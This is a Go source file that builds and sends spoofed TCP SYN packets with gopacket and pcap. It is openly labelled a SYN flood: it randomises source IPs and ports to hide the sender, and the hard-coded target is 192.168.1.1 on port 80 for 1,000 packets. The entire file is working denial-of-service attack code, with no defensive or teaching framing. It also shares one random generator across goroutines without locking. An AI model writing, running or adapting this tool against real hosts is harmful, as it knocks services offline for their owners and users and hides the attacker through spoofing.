package main

import (
	"log"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Random fake IP address
func randomIP(randSource *rand.Rand) net.IP {
	return net.IPv4(
		byte(1+randSource.Intn(254)), // Random byte 1-254
		byte(randSource.Intn(256)),   // Random byte 0-255
		byte(randSource.Intn(256)),   // Random byte 0-255
		byte(randSource.Intn(256)),   // Random byte 0-255
	)
}

func sendSynFlood(target string, port uint16, numPackets int, randSource *rand.Rand) {
	handle, err := pcap.OpenLive("eth0", 1024, false, pcap.BlockForever) // Change "eth0" to your network interface
	if err != nil {
		log.Fatalf("Failed to open device: %v", err)
	}
	defer handle.Close()

	for i := 0; i < numPackets; i++ { // Send numPackets packets
		go func() {
			ipLayer := &layers.IPv4{
				SrcIP:    randomIP(randSource), // Use random source IP address for each packet
				DstIP:    net.ParseIP(target),  // Target IP address
				Protocol: layers.IPProtocolTCP,
			}

			tcpLayer := &layers.TCP{
				SrcPort: layers.TCPPort(randSource.Intn(65535)), // Random source port
				DstPort: layers.TCPPort(port),                   // Target port
				SYN:     true,
				Window:  14600,
			}

			// Calculate TCP checksum
			err := tcpLayer.SetNetworkLayerForChecksum(ipLayer)
			if err != nil {
				log.Printf("Failed to set checksum: %v", err)
				return
			}

			// Create buffer and serialize layers
			buffer := gopacket.NewSerializeBuffer()
			options := gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}
			err = gopacket.SerializeLayers(buffer, options, ipLayer, tcpLayer)
			if err != nil {
				log.Printf("Failed to serialize layers: %v", err)
				return
			}

			err = handle.WritePacketData(buffer.Bytes())
			if err != nil {
				log.Printf("Failed to send packet: %v", err)
			}
		}()
		time.Sleep(10 * time.Millisecond) // Delay between packets
	}
}

func main() {
	// Seed random number generator
	randSource := rand.New(rand.NewSource(time.Now().UnixNano()))

	target := "192.168.1.1" // Target IP address
	port := uint16(80)      // Target port
	numPackets := 1000      // Number of packets to send

	log.Printf("Launching SYN Flood on %s:%d with %d packets\n", target, port, numPackets)
	sendSynFlood(target, port, numPackets, randSource)

	select {} // Run forever
}
